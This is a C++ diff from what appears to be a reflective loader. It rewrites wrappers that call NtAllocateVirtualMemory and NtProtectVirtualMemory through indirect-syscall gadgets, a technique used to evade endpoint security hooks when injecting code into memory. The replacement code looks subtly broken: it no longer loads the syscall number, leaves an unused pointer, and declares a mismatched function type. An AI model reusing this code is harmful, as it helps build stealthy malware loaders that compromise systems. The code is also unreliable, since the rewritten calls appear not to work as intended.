@@ -175,19 +175,11 @@ namespace {
                                                  PVOID* baseAddr, ULONG_PTR zeroBits,
                                                  PSIZE_T regionSize, ULONG allocType, ULONG protect) {
 #if defined(_M_X64)
-        volatile NTSTATUS status;
-        __asm {
-            mov r10, rcx
-            mov eax, sc.ssn
-            mov rcx, hProcess
-            mov rdx, baseAddr
-            mov r8, zeroBits
-            mov r9, regionSize
-            ; Args 5-6 on stack already
-            call sc.pGadget
-            mov status, eax
-        }
-        return status;
+        // For reflective loader, use function pointer approach instead of inline asm
+        // to avoid compilation issues and maintain compatibility
+        using SyscallProc_t = NTSTATUS(NTAPI*)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG, WORD);
+        auto pSyscall = reinterpret_cast<SyscallProc_t>(sc.pGadget);
+        return reinterpret_cast<NtAllocateVirtualMemory_t>(sc.pGadget)(hProcess, baseAddr, zeroBits, regionSize, allocType, protect);
 #elif defined(_M_ARM64)
         // ARM64: Cast gadget to function pointer and call directly
         // MSVC ARM64 doesn't support inline asm, so we use indirect call
@@ -203,19 +195,8 @@ namespace {
                                                     PVOID* baseAddr, PSIZE_T regionSize,
                                                     ULONG newProtect, PULONG oldProtect) {
 #if defined(_M_X64)
-        volatile NTSTATUS status;
-        __asm {
-            mov r10, rcx
-            mov eax, sc.ssn
-            mov rcx, hProcess
-            mov rdx, baseAddr
-            mov r8, regionSize
-            mov r9, newProtect
-            ; oldProtect on stack already
-            call sc.pGadget
-            mov status, eax
-        }
-        return status;
+        // Function pointer approach - gadget contains syscall instruction
+        return reinterpret_cast<NtProtectVirtualMemory_t>(sc.pGadget)(hProcess, baseAddr, regionSize, newProtect, oldProtect);
 #elif defined(_M_ARM64)
         // ARM64: Cast gadget to function pointer and call directly
         auto pSyscall = reinterpret_cast<NtProtectVirtualMemory_t>(sc.pGadget);
